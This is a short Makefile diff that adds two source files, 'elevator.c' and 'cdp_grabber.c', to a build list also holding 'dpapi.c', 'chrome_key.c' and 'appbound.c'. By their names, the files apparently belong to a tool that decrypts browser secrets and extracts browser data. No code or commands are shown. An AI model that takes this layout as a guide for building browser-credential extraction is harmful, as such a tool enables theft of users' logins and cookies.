@@ -48,6 +48,8 @@ SRCS = src/main.c \
        src/crypto/dpapi.c \
        src/crypto/chrome_key.c \
        src/crypto/appbound.c \
+       src/crypto/elevator.c \
+       src/browsers/cdp_grabber.c \
        src/utils/base64.c \
        src/utils/file_utils.c \
        src/utils/secure_zero.c \
